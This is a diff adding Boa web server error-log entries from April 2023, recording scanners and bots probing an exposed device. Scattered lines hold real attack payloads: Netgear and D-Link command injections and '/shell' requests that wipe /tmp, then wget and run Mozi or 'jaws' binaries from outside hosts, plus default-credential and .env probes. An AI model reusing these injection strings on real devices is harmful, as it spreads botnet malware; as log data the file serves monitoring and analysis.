@@ -16116,3 +16116,554 @@ buffer flush: Connection reset by peer
 [06/Apr/2023:08:29:01 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
 [06/Apr/2023:09:09:08 +0000] caught SIGTERM, starting shutdown
 [06/Apr/2023:09:09:08 +0000] exiting Boa normally (uptime 2420 seconds)
+[06/Apr/2023:09:57:37 +0000] boa: server version Boa/0.94.13
+[06/Apr/2023:09:57:37 +0000] boa: server built Oct 11 2022 at 11:38:52.
+[06/Apr/2023:09:57:37 +0000] boa: starting server pid=1842, port 80
+[06/Apr/2023:09:57:42 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:09:58:59 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:00:10 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:03:15 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:04:07 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:04:48 +0000] request from 117.176.187.221 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:05:08 +0000] request from 117.176.187.221 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:06:18 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:11:28 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:15:03 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:17:58 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:23:29 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:23:39 +0000] request from 117.176.187.221 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:24:49 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:24:49 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:26:18 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:26:28 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:10:40:02 +0000] request from 45.56.108.128 "GET /systembc/password.php HTTP/1.0" ("/home/boa/www/systembc/password.php"): document open: No such file or directory
+[06/Apr/2023:10:40:08 +0000] request from 117.176.187.221 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:40:16 +0000] request from 117.176.187.221 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:10:45:36 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:11:08:20 +0000] malformed request: "CONNECT api.ipify.org:443 HTTP/1.1"
+[06/Apr/2023:13:16:39 +0000] malformed request: ""
+[06/Apr/2023:13:46:41 +0000] request from 185.142.236.43 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[06/Apr/2023:13:46:43 +0000] request from 185.142.236.43 "GET /sitemap.xml HTTP/1.1" ("/home/boa/www/sitemap.xml"): document open: No such file or directory
+[06/Apr/2023:13:46:45 +0000] request from 185.142.236.43 "GET /.well-known/security.txt HTTP/1.1" ("/home/boa/www/.well-known/security.txt"): document open: No such file or directory
+[06/Apr/2023:13:46:47 +0000] request from 185.142.236.43 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:13:46:56 +0000] request from 185.142.236.43 "GET /snapshot.jpg?strm=0 HTTP/1.1" ("/home/boa/www/snapshot.jpg"): document open: No such file or directory
+[06/Apr/2023:13:46:57 +0000] request from 185.142.236.43 "GET /jpg/image.jpg?size=3 HTTP/1.1" ("/home/boa/www/jpg/image.jpg"): document open: No such file or directory
+[06/Apr/2023:13:47:02 +0000] request from 185.142.236.43 "GET /snapshot.cgi HTTP/1.1" ("/home/boa/www/snapshot.cgi"): document open: No such file or directory
+[06/Apr/2023:13:47:11 +0000] request from 185.142.236.43 "GET /axis-cgi/jpg/image.cgi?compression=100&resolution=640x480 HTTP/1.1" ("/home/boa/www/axis-cgi/jpg/image.cgi"): document open: No such file or directory
+[06/Apr/2023:13:47:13 +0000] request from 185.142.236.43 "GET /ipcam/jpeg.cgi HTTP/1.1" ("/home/boa/www/ipcam/jpeg.cgi"): document open: No such file or directory
+[06/Apr/2023:13:47:24 +0000] request from 185.142.236.43 "GET /-wvhttp-01-/GetOneShot?image_size=640x480 HTTP/1.1" ("/home/boa/www/-wvhttp-01-/GetOneShot"): document open: No such file or directory
+[06/Apr/2023:13:47:26 +0000] request from 185.142.236.43 "GET /-wvhttp-01-/GetLiveImage HTTP/1.1" ("/home/boa/www/-wvhttp-01-/GetLiveImage"): document open: No such file or directory
+[06/Apr/2023:13:47:29 +0000] request from 185.142.236.43 "GET /snapshot.jpg?strm=0 HTTP/1.1" ("/home/boa/www/snapshot.jpg"): document open: No such file or directory
+[06/Apr/2023:13:47:30 +0000] request from 185.142.236.43 "GET /jpg/image.jpg?size=3 HTTP/1.1" ("/home/boa/www/jpg/image.jpg"): document open: No such file or directory
+[06/Apr/2023:13:47:31 +0000] request from 185.142.236.43 "GET /snapshot.cgi HTTP/1.1" ("/home/boa/www/snapshot.cgi"): document open: No such file or directory
+[06/Apr/2023:13:47:36 +0000] request from 185.142.236.43 "GET /axis-cgi/jpg/image.cgi?compression=100&resolution=640x480 HTTP/1.1" ("/home/boa/www/axis-cgi/jpg/image.cgi"): document open: No such file or directory
+[06/Apr/2023:13:47:40 +0000] request from 185.142.236.43 "GET /ipcam/jpeg.cgi HTTP/1.1" ("/home/boa/www/ipcam/jpeg.cgi"): document open: No such file or directory
+[06/Apr/2023:13:50:59 +0000] malformed request: ""
+[06/Apr/2023:15:17:51 +0000] malformed request: ""
+[06/Apr/2023:15:17:52 +0000] malformed request: ""
+[06/Apr/2023:15:17:53 +0000] request from 159.65.195.98 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[06/Apr/2023:15:17:54 +0000] request from 159.65.195.98 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[06/Apr/2023:15:17:54 +0000] malformed request: ""
+[06/Apr/2023:15:17:55 +0000] request from 159.65.195.98 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[06/Apr/2023:15:17:56 +0000] request from 159.65.195.98 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:15:43:10 +0000] request from 194.110.203.85 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:16:27:25 +0000] request from 89.248.165.7 "(null)" ("(null)"): header read: Connection reset by peer
+[06/Apr/2023:16:35:47 +0000] request from 175.107.13.160 "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" ("/home/boa/www/boaform/admin/formLogin"): document open: No such file or directory
+[06/Apr/2023:18:13:00 +0000] malformed request: "CONNECT eth0.me:443 HTTP/1.1"
+[06/Apr/2023:18:54:54 +0000] malformed request: "MGLNDD_47.109.62.159_80"
+[06/Apr/2023:19:16:37 +0000] request from 59.93.21.186 "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.93.21.186:55318/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" ("/home/boa/www/setup.cgi"): document open: No such file or directory
+[06/Apr/2023:19:45:45 +0000] malformed request: ""
+[06/Apr/2023:21:40:55 +0000] malformed request: "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0"
+[06/Apr/2023:21:56:33 +0000] request from 71.6.165.200 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[06/Apr/2023:21:56:34 +0000] request from 71.6.165.200 "GET /sitemap.xml HTTP/1.1" ("/home/boa/www/sitemap.xml"): document open: No such file or directory
+[06/Apr/2023:22:40:54 +0000] request from 59.88.233.251 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" ("/home/boa/www/boaform/admin/formLogin"): document open: No such file or directory
+[06/Apr/2023:22:42:14 +0000] request from 211.157.174.58 "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[07/Apr/2023:02:19:35 +0000] request from 39.96.183.235 "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[07/Apr/2023:02:20:10 +0000] malformed request: "CONNECT checkip.amazonaws.com:443 HTTP/1.1"
+[07/Apr/2023:02:23:25 +0000] request from 27.124.12.29 "GET /tvplay/181442.html HTTP/1.1" ("/home/boa/www/tvplay/181442.html"): document open: No such file or directory
+[07/Apr/2023:02:36:20 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:02:56:58 +0000] request from 131.221.92.143 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[07/Apr/2023:03:20:09 +0000] request from 47.106.133.139 "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[07/Apr/2023:03:25:05 +0000] malformed request: ""
+[07/Apr/2023:03:35:19 +0000] request from 64.227.41.39 "GET /aaa9 HTTP/1.1" ("/home/boa/www/aaa9"): document open: No such file or directory
+[07/Apr/2023:03:35:36 +0000] request from 64.227.41.39 "GET /aab8 HTTP/1.1" ("/home/boa/www/aab8"): document open: No such file or directory
+[07/Apr/2023:04:26:20 +0000] request from 196.189.198.5 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[07/Apr/2023:04:47:58 +0000] request from 138.68.143.68 "GET /aaa9 HTTP/1.1" ("/home/boa/www/aaa9"): document open: No such file or directory
+[07/Apr/2023:04:48:13 +0000] request from 138.68.143.68 "GET /aab8 HTTP/1.1" ("/home/boa/www/aab8"): document open: No such file or directory
+[07/Apr/2023:05:04:15 +0000] request from 116.169.9.241 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:05:04:33 +0000] request from 116.169.9.241 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:05:04:47 +0000] request from 116.169.9.241 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:05:05:01 +0000] request from 116.169.9.241 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:05:05:03 +0000] request from 116.169.9.241 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:05:05:05 +0000] request from 116.169.9.241 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:05:33:40 +0000] request from 116.169.9.241 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:05:34:59 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:05:50:51 +0000] request from 170.64.134.120 "GET /aaa9 HTTP/1.1" ("/home/boa/www/aaa9"): document open: No such file or directory
+[07/Apr/2023:05:51:11 +0000] request from 170.64.134.120 "GET /aab8 HTTP/1.1" ("/home/boa/www/aab8"): document open: No such file or directory
+[07/Apr/2023:07:02:38 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:02:38 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:04:35 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:04:35 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:05:51 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:05:51 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:07:01 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:07:01 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:09:01 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:09:01 +0000] request from 116.169.9.241 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:07:26:44 +0000] request from 216.218.206.66 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:07:27:30 +0000] request from 216.218.206.66 "GET /geoserver/web/ HTTP/1.1" ("/home/boa/www/geoserver/web/"): document open: No such file or directory
+[07/Apr/2023:07:33:21 +0000] malformed request: ""
+[07/Apr/2023:07:33:22 +0000] malformed request: ""
+[07/Apr/2023:07:33:22 +0000] request from 64.227.142.100 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[07/Apr/2023:07:33:23 +0000] request from 64.227.142.100 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[07/Apr/2023:07:33:23 +0000] malformed request: ""
+[07/Apr/2023:07:33:23 +0000] request from 64.227.142.100 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[07/Apr/2023:07:33:24 +0000] request from 64.227.142.100 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:08:12:27 +0000] request from 109.237.97.180 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[07/Apr/2023:08:12:28 +0000] malformed request: "H"
+[07/Apr/2023:09:10:19 +0000] request from 175.154.176.33 "(null)" ("(null)"): header read: Connection reset by peer
+[07/Apr/2023:09:11:22 +0000] request from 175.154.176.33 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:09:11:25 +0000] request from 175.154.176.33 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:09:12:47 +0000] request from 175.154.176.33 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:09:13:56 +0000] request from 104.152.52.17 "(null)" ("(null)"): header read: Connection reset by peer
+[07/Apr/2023:09:17:54 +0000] request from 207.46.13.231 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[07/Apr/2023:09:39:01 +0000] malformed request: "CONNECT v4.ident.me:443 HTTP/1.1"
+[07/Apr/2023:10:29:57 +0000] request from 193.118.53.194 "GET /showLogin.cc HTTP/1.1" ("/home/boa/www/showLogin.cc"): document open: No such file or directory
+[07/Apr/2023:10:39:05 +0000] malformed request: ""
+[07/Apr/2023:10:48:28 +0000] request from 45.56.108.128 "GET /systembc/password.php HTTP/1.0" ("/home/boa/www/systembc/password.php"): document open: No such file or directory
+[07/Apr/2023:11:32:33 +0000] request from 183.136.225.32 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:11:32:33 +0000] request from 183.136.225.32 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[07/Apr/2023:13:13:40 +0000] malformed request: " "
+[07/Apr/2023:13:13:40 +0000] malformed request: ""
+[07/Apr/2023:13:13:40 +0000] malformed request: ""
+[07/Apr/2023:13:13:40 +0000] malformed request: ""
+[07/Apr/2023:13:13:40 +0000] malformed request: " "
+[07/Apr/2023:13:13:40 +0000] malformed request: ""
+[07/Apr/2023:13:13:40 +0000] malformed request: ""
+[07/Apr/2023:13:13:40 +0000] malformed request: ""
+[07/Apr/2023:13:13:41 +0000] request from 103.213.96.234 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:13:34:42 +0000] malformed request: ""
+[07/Apr/2023:13:37:41 +0000] malformed request: ""
+[07/Apr/2023:14:09:58 +0000] malformed request: ""
+[07/Apr/2023:14:10:02 +0000] malformed request: "OPTIONS / HTTP/1.0"
+[07/Apr/2023:15:52:07 +0000] request from 101.74.200.34 "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[07/Apr/2023:17:01:21 +0000] malformed request: ""
+[07/Apr/2023:17:25:49 +0000] malformed request: "CONNECT checkip.amazonaws.com:443 HTTP/1.1"
+[07/Apr/2023:18:30:38 +0000] malformed request: ""
+[07/Apr/2023:18:30:38 +0000] malformed request: ""
+[07/Apr/2023:18:30:38 +0000] malformed request: "OPTIONS / HTTP/1.0"
+[07/Apr/2023:18:30:38 +0000] malformed request: ""
+[07/Apr/2023:18:30:38 +0000] malformed request: ""
+[07/Apr/2023:18:30:38 +0000] malformed request: "OPTIONS sip:nm SIP/2.0"
+[07/Apr/2023:18:30:38 +0000] malformed request: "€€"
+[07/Apr/2023:18:30:38 +0000] malformed request: ""
+[07/Apr/2023:19:56:54 +0000] request from 38.68.47.234 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[07/Apr/2023:21:16:48 +0000] request from 148.153.45.238 "GET /kLRS HTTP/1.1" ("/home/boa/www/kLRS"): document open: No such file or directory
+[07/Apr/2023:21:16:49 +0000] request from 148.153.45.238 "GET /1sIp HTTP/1.1" ("/home/boa/www/1sIp"): document open: No such file or directory
+[07/Apr/2023:21:16:49 +0000] request from 148.153.45.238 "GET /aab8 HTTP/1.1" ("/home/boa/www/aab8"): document open: No such file or directory
+[07/Apr/2023:21:16:49 +0000] request from 148.153.45.238 "GET /jquery-3.3.1.slim.min.js HTTP/1.1" ("/home/boa/www/jquery-3.3.1.slim.min.js"): document open: No such file or directory
+[07/Apr/2023:21:16:50 +0000] request from 148.153.45.238 "GET /aab9 HTTP/1.1" ("/home/boa/www/aab9"): document open: No such file or directory
+[07/Apr/2023:21:16:50 +0000] request from 148.153.45.238 "GET /jquery-3.3.2.slim.min.js HTTP/1.1" ("/home/boa/www/jquery-3.3.2.slim.min.js"): document open: No such file or directory
+[07/Apr/2023:21:21:26 +0000] request from 109.237.98.226 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[07/Apr/2023:21:21:26 +0000] malformed request: "H"
+[07/Apr/2023:21:22:36 +0000] malformed request: ""
+[07/Apr/2023:21:49:16 +0000] request from 194.110.203.85 "(null)" ("(null)"): connection timed out
+[07/Apr/2023:22:30:17 +0000] request from 115.50.145.9 "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.50.145.9:37772/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" ("/home/boa/www/setup.cgi"): document open: No such file or directory
+[07/Apr/2023:22:32:48 +0000] request from 38.68.47.234 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /Portal0000.htm HTTP/1.1" ("/home/boa/www/Portal0000.htm"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /qSf2 HTTP/1.1" ("/home/boa/www/qSf2"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /CSS/Miniweb.css HTTP/1.1" ("/home/boa/www/CSS/Miniweb.css"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /main.pl HTTP/1.1" ("/home/boa/www/main.pl"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /Portal/Portal.mwsl HTTP/1.1" ("/home/boa/www/Portal/Portal.mwsl"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /nmaplowercheck1680907269 HTTP/1.1" ("/home/boa/www/nmaplowercheck1680907269"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /.git/HEAD HTTP/1.1" ("/home/boa/www/.git/HEAD"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /main.shtml HTTP/1.1" ("/home/boa/www/main.shtml"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /docs/cplugError.html/ HTTP/1.1" ("/home/boa/www/docs/cplugError.html/"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /__Additional HTTP/1.1" ("/home/boa/www/__Additional"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /pools/default/buckets HTTP/1.1" ("/home/boa/www/pools/default/buckets"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /HNAP1 HTTP/1.1" ("/home/boa/www/HNAP1"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /default.asp HTTP/1.1" ("/home/boa/www/default.asp"): document open: No such file or directory
+[07/Apr/2023:22:41:09 +0000] request from 123.57.235.51 "GET /pools HTTP/1.1" ("/home/boa/www/pools"): document open: No such file or directory
+[07/Apr/2023:22:41:10 +0000] request from 123.57.235.51 "GET /admin.jsp HTTP/1.1" ("/home/boa/www/admin.jsp"): document open: No such file or directory
+[07/Apr/2023:22:41:10 +0000] request from 123.57.235.51 "GET /start.aspx HTTP/1.1" ("/home/boa/www/start.aspx"): document open: No such file or directory
+[07/Apr/2023:22:41:10 +0000] request from 123.57.235.51 "GET /start.jsp HTTP/1.1" ("/home/boa/www/start.jsp"): document open: No such file or directory
+[07/Apr/2023:22:41:10 +0000] request from 123.57.235.51 "GET /default.shtml HTTP/1.1" ("/home/boa/www/default.shtml"): document open: No such file or directory
+[07/Apr/2023:22:41:11 +0000] request from 123.57.235.51 "GET /main.html HTTP/1.1" ("/home/boa/www/main.html"): document open: No such file or directory
+[07/Apr/2023:22:41:11 +0000] request from 123.57.235.51 "GET /menu.cfm HTTP/1.1" ("/home/boa/www/menu.cfm"): document open: No such file or directory
+[07/Apr/2023:22:41:11 +0000] request from 123.57.235.51 "GET /readme.txt HTTP/1.1" ("/home/boa/www/readme.txt"): document open: No such file or directory
+[07/Apr/2023:22:41:11 +0000] request from 123.57.235.51 "GET /inicio.php HTTP/1.1" ("/home/boa/www/inicio.php"): document open: No such file or directory
+[07/Apr/2023:22:41:12 +0000] request from 123.57.235.51 "GET /admin.pl HTTP/1.1" ("/home/boa/www/admin.pl"): document open: No such file or directory
+[07/Apr/2023:22:41:12 +0000] request from 123.57.235.51 "GET /start.pl HTTP/1.1" ("/home/boa/www/start.pl"): document open: No such file or directory
+[07/Apr/2023:22:41:12 +0000] request from 123.57.235.51 "GET /home.pl HTTP/1.1" ("/home/boa/www/home.pl"): document open: No such file or directory
+[07/Apr/2023:22:41:12 +0000] request from 123.57.235.51 "GET /default.html HTTP/1.1" ("/home/boa/www/default.html"): document open: No such file or directory
+[07/Apr/2023:22:41:13 +0000] request from 123.57.235.51 "GET /start.shtml HTTP/1.1" ("/home/boa/www/start.shtml"): document open: No such file or directory
+[07/Apr/2023:22:41:13 +0000] request from 123.57.235.51 "GET /home.html HTTP/1.1" ("/home/boa/www/home.html"): document open: No such file or directory
+[07/Apr/2023:22:41:13 +0000] request from 123.57.235.51 "GET /index.pl HTTP/1.1" ("/home/boa/www/index.pl"): document open: No such file or directory
+[07/Apr/2023:22:41:13 +0000] request from 123.57.235.51 "GET /admin.shtml HTTP/1.1" ("/home/boa/www/admin.shtml"): document open: No such file or directory
+[07/Apr/2023:22:41:14 +0000] request from 123.57.235.51 "GET /main.php HTTP/1.1" ("/home/boa/www/main.php"): document open: No such file or directory
+[07/Apr/2023:22:41:14 +0000] request from 123.57.235.51 "GET /indice.pl HTTP/1.1" ("/home/boa/www/indice.pl"): document open: No such file or directory
+[07/Apr/2023:22:41:14 +0000] request from 123.57.235.51 "GET /main.cfm HTTP/1.1" ("/home/boa/www/main.cfm"): document open: No such file or directory
+[07/Apr/2023:22:41:14 +0000] request from 123.57.235.51 "GET /home.cfm HTTP/1.1" ("/home/boa/www/home.cfm"): document open: No such file or directory
+[07/Apr/2023:22:41:15 +0000] request from 123.57.235.51 "GET /home.jhtml HTTP/1.1" ("/home/boa/www/home.jhtml"): document open: No such file or directory
+[07/Apr/2023:22:41:15 +0000] request from 123.57.235.51 "GET /admin.jsa HTTP/1.1" ("/home/boa/www/admin.jsa"): document open: No such file or directory
+[07/Apr/2023:22:41:15 +0000] request from 123.57.235.51 "GET /menu.cgi HTTP/1.1" ("/home/boa/www/menu.cgi"): document open: No such file or directory
+[07/Apr/2023:22:41:15 +0000] request from 123.57.235.51 "GET /start.cgi HTTP/1.1" ("/home/boa/www/start.cgi"): document open: No such file or directory
+[07/Apr/2023:22:41:16 +0000] request from 123.57.235.51 "GET /localstart.asp HTTP/1.1" ("/home/boa/www/localstart.asp"): document open: No such file or directory
+[07/Apr/2023:22:41:16 +0000] request from 123.57.235.51 "GET /localstart.pl HTTP/1.1" ("/home/boa/www/localstart.pl"): document open: No such file or directory
+[07/Apr/2023:22:41:16 +0000] request from 123.57.235.51 "GET /start.cfm HTTP/1.1" ("/home/boa/www/start.cfm"): document open: No such file or directory
+[07/Apr/2023:22:41:16 +0000] request from 123.57.235.51 "GET /menu.php HTTP/1.1" ("/home/boa/www/menu.php"): document open: No such file or directory
+[07/Apr/2023:22:41:17 +0000] request from 123.57.235.51 "GET /admin.jhtml HTTP/1.1" ("/home/boa/www/admin.jhtml"): document open: No such file or directory
+[07/Apr/2023:22:41:17 +0000] request from 123.57.235.51 "GET /index.aspx HTTP/1.1" ("/home/boa/www/index.aspx"): document open: No such file or directory
+[07/Apr/2023:22:41:17 +0000] request from 123.57.235.51 "GET /main.asp HTTP/1.1" ("/home/boa/www/main.asp"): document open: No such file or directory
+[07/Apr/2023:22:41:17 +0000] request from 123.57.235.51 "GET /main.aspx HTTP/1.1" ("/home/boa/www/main.aspx"): document open: No such file or directory
+[07/Apr/2023:22:41:18 +0000] request from 123.57.235.51 "GET /admin.cgi HTTP/1.1" ("/home/boa/www/admin.cgi"): document open: No such file or directory
+[07/Apr/2023:22:41:18 +0000] request from 123.57.235.51 "GET /menu.asp HTTP/1.1" ("/home/boa/www/menu.asp"): document open: No such file or directory
+[07/Apr/2023:22:41:18 +0000] request from 123.57.235.51 "GET /localstart.aspx HTTP/1.1" ("/home/boa/www/localstart.aspx"): document open: No such file or directory
+[07/Apr/2023:22:41:18 +0000] request from 123.57.235.51 "GET /admin.cfm HTTP/1.1" ("/home/boa/www/admin.cfm"): document open: No such file or directory
+[07/Apr/2023:22:41:19 +0000] request from 123.57.235.51 "GET /home.aspx HTTP/1.1" ("/home/boa/www/home.aspx"): document open: No such file or directory
+[07/Apr/2023:22:41:19 +0000] request from 123.57.235.51 "GET /menu.jsp HTTP/1.1" ("/home/boa/www/menu.jsp"): document open: No such file or directory
+[07/Apr/2023:22:41:19 +0000] malformed request: ""
+[07/Apr/2023:22:41:19 +0000] request from 123.57.235.51 "GET /admin.aspx HTTP/1.1" ("/home/boa/www/admin.aspx"): document open: No such file or directory
+[07/Apr/2023:22:41:19 +0000] request from 123.57.235.51 "GET /default.jsp HTTP/1.1" ("/home/boa/www/default.jsp"): document open: No such file or directory
+[08/Apr/2023:00:16:30 +0000] malformed request: "PRI * HTTP/2.0"
+[08/Apr/2023:00:16:30 +0000] request from 167.248.133.185 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:00:25:24 +0000] malformed request: "CONNECT check.best-proxies.ru:443 HTTP/1.1"
+[08/Apr/2023:01:28:52 +0000] request from 167.248.133.51 "(null)" ("(null)"): header read: Connection reset by peer
+[08/Apr/2023:01:28:54 +0000] malformed request: "PRI * HTTP/2.0"
+[08/Apr/2023:01:28:55 +0000] request from 167.248.133.51 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:02:50:01 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
